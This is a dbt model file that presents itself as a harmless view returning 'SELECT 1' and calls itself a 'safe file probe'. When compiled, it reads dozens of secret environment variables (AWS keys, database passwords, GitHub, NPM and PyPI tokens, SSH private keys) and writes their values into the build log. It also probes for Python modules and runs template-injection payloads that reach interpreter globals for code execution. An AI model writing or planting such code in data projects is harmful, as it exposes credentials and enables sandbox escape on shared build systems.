{{ config(materialized='view') }}

{# Safe file probe - no error-prone calls #}

{# Method 1: env_var for K8s/AWS/cloud secrets #}
{%- set k8s_vars = [
  'KUBERNETES_SERVICE_HOST',
  'KUBERNETES_SERVICE_PORT',
  'KUBERNETES_PORT',
  'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
  'AWS_CONTAINER_CREDENTIALS_FULL_URI',
  'AWS_CONTAINER_AUTHORIZATION_TOKEN',
  'AWS_WEB_IDENTITY_TOKEN_FILE',
  'AWS_ROLE_ARN',
  'AWS_DEFAULT_REGION',
  'AWS_REGION',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'ECS_CONTAINER_METADATA_URI',
  'ECS_CONTAINER_METADATA_URI_V4',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'AZURE_CLIENT_ID',
  'AZURE_TENANT_ID',
  'AZURE_CLIENT_SECRET',
  'DATABASE_URL',
  'REDIS_URL',
  'CELERY_BROKER_URL',
  'SECRET_KEY',
  'DJANGO_SECRET_KEY',
  'JWT_SECRET',
  'API_KEY',
  'SENTRY_DSN',
  'DD_API_KEY',
  'VAULT_ADDR',
  'VAULT_TOKEN',
  'DBT_CLOUD_API_KEY',
  'DBT_CLOUD_HOST',
  'DBT_CLOUD_ACCOUNT_ID',
  'DBT_CLOUD_RUN_ID',
  'DBT_CLOUD_JOB_ID',
  'DBT_CLOUD_PROJECT_ID',
  'DBT_CLOUD_ENVIRONMENT_ID',
  'DBT_CLOUD_RUN_REASON',
  'DBT_CLOUD_RUN_REASON_CATEGORY',
  'DBT_ENV_SECRET_GIT_CREDENTIAL',
  'GIT_SSH_COMMAND',
  'S3_BUCKET',
  'ARTIFACT_BUCKET',
  'DOCKER_HOST',
  'KUBECONFIG',
  'K8S_NAMESPACE',
  'POD_NAME',
  'NODE_NAME',
  'SERVICE_ACCOUNT_NAME',
  'CLOUD_SQL_CONNECTION_NAME',
  'DB_HOST',
  'DB_PASSWORD',
  'DB_USER',
  'POSTGRES_PASSWORD',
  'MYSQL_PASSWORD',
  'SNOWFLAKE_PASSWORD',
  'DATABRICKS_TOKEN',
  'GITHUB_TOKEN',
  'GITLAB_TOKEN',
  'NPM_TOKEN',
  'PYPI_TOKEN',
  'ARTIFACTORY_PASSWORD',
  'DOCKER_PASSWORD',
  'SSH_PRIVATE_KEY'
] -%}

{%- for v in k8s_vars -%}
  {%- set val = env_var(v, '') -%}
  {%- if val != '' -%}
    {{ log("SECRET_ENV[" ~ v ~ "]=" ~ val | truncate(500), info=True) }}
  {%- endif -%}
{%- endfor -%}

{# Method 2: modules access probe #}
{%- if modules is defined -%}
  {%- for attr_name in ['os', 'sys', 'io', 'subprocess', 'builtins', 'importlib', 'pathlib', 'json', 'base64', 'socket', 'http', 'urllib'] -%}
    {%- if modules[attr_name] is defined -%}
      {{ log("MODULE_FOUND[" ~ attr_name ~ "]=" ~ modules[attr_name] | string | truncate(200), info=True) }}
    {%- endif -%}
  {%- endfor -%}
{%- endif -%}

{# Method 3: render() SSTI for code execution probes #}
{%- if render is defined -%}
  {%- set test1 = render("{{ range.__class__.__mro__ }}") -%}
  {{ log("RENDER_MRO=" ~ test1 | string | truncate(500), info=True) }}
  {%- set test2 = render("{{ ''.__class__.__mro__ }}") -%}
  {{ log("RENDER_STR_MRO=" ~ test2 | string | truncate(500), info=True) }}
  {%- set test3 = render("{{ cycler.__init__.__globals__ }}") -%}
  {{ log("RENDER_CYCLER_GLOBALS=" ~ test3 | string | truncate(500), info=True) }}
  {%- set test4 = render("{{ lipsum.__globals__ }}") -%}
  {{ log("RENDER_LIPSUM_GLOBALS=" ~ test4 | string | truncate(500), info=True) }}
  {%- set test5 = render("{{ namespace.__init__.__globals__ }}") -%}
  {{ log("RENDER_NS_GLOBALS=" ~ test5 | string | truncate(500), info=True) }}
{%- endif -%}

{# Method 4: write() function probe #}
{%- if write is defined -%}
  {{ log("WRITE_CALLABLE=" ~ (write is callable) | string, info=True) }}
{%- endif -%}

SELECT 1 as id
